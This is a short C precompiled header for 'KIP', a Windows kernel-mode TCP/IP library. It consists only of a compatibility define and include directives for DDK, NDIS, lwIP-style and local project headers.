//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KIP (NT-kernel TCP/IP implementation library)
//	
// module: project.h
// $Revision: 79 $
// $Date: 2012-01-18 12:59:39 +0400 (Ср, 18 янв 2012) $
// description: 
//	precompiled header

#pragma once

#define _WIN2K_COMPAT_SLIST_USAGE 1

#include <ntddk.h>
#include <ndis.h>
#include <ntintsafe.h>
#include <wwan.h>
#include <ndiswwan.h>
#include <ntimage.h>
#include <inaddr.h>
#include <tdikrnl.h>
#include "macros.h"

#include "ntddkex.h"
#include "kdbg.h"
#include "bklib.h"
#include "rtl.h"
#include "debug.h"
#include "iphdr.h"

#include "ndisx.h"

// if
#include "kipioctl.h"

//lwip if
#include "rosip.h"
#include "etharp.h"

//local headers
#include "khook.h"
#include "miniport.h"
#include "protocol.h"
#include "ndisif.h"